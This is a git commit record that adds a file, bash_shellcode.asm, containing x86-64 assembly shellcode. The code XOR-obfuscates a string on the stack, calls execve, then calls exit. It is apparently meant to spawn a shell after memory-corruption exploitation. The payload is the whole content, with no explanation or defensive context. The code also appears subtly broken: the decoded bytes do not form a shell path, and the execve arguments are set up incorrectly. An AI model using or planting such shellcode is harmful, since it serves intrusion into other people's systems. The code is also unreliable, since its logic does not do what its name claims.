579c97d5233a2e3d0ffc659685acf89e6c67e2d7
Ali Can Gönüllü <alicangonullu@yahoo.com>
2023-08-16 17:25:30 +0300

    Add files via upload

---
+++ bash_shellcode.asm
@@ -0,0 +1,27 @@
+BITS 64
+
+section .data
+section .text
+global _start
+ 
+_start:
+  xor rax, rax
+  mov [rsp-8], rax
+  mov qword [rsp-16], 0x72613162
+  xor byte [rsp-16], 0x08
+  xor byte [rsp-15], 0x16
+  xor byte [rsp-14], 0x24
+  xor byte [rsp-13], 0x32
+  lea rdx, [rsp-16]
+  mov qword [rsp-24], rdx
+  mov qword [rsp-32], rdx
+  lea rdi, [rsp-32]
+ 
+  xor eax, eax
+  mov al, 59
+  syscall
+ 
+  xor eax, eax
+  mov ebx, eax
+  mov al, 60
+  syscall
